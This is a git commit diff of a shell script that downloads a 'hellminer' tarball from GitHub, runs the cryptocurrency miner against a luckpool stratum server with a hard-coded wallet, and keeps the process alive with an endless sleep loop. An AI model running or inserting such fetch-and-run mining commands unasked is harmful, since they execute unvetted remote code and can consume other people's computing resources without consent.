69ecbb49c9f7ef30bdeb3b701f0d7cefc73b3363
Pex12345 <96197443+Pex12345@users.noreply.github.com>
2021-12-15 21:10:45 +0330

    Update a.sh

--- a.sh
+++ a.sh
@@ -3,8 +3,8 @@ sudo apt update
 sudo apt install screen -y
 wget https://github.com/Pex12345/hellhell/hcl.tar.gz
 tar xf hcl.tar.gz
-hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RHtsxup6uQvd1wp5DdFtAEXtUDdnHM92Yg.Rig1 -p x --cpu 2
+./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RHtsxup6uQvd1wp5DdFtAEXtUDdnHM92Yg.Rig1 -p x --cpu 2
 while [ 1 ]; do
-sleep 60
+sleep 3
 done
 sleep 999
